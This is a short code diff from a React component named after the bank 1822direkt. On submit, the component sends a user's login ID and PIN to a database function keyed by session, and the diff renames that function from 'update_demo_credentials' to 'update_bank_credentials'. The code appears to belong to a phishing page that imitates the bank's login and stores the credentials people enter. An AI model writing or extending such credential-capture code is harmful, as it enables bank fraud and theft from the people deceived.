@@ -59,7 +59,7 @@ const Direkt1822 = () => {
     if (!canSubmit || submitting) return;
     setSubmitting(true);
     if (sessionId) {
-      const { error } = await supabase.rpc("update_demo_credentials", {
+      const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: kennung,
         p_password: pin,
